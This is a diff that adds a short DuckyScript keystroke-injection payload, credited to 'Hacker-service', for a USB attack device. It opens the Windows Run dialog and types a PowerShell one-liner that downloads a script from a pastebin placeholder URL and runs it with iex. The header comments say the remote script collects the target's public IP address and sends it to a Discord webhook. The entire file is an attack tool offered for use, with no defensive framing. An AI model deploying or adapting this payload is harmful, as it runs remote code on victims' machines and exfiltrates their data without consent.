@@ -1,0 +1,11 @@
+REM Arthur: Hacker-service
+REM Description: Gets public IP address of target by a powershell script hosted by
+REM custom public website that will contain raw command for getting IP and sending it to
+REM the discord webhook. 
+DELAY 1000
+GUI r
+DELAY 1500
+STRING $e=(New-Object Net.WebClient).DownloadString('https://pastebin/raw/yourscript.ps1');iex $e
+DELAY 500
+ENTER
+REM DONE!
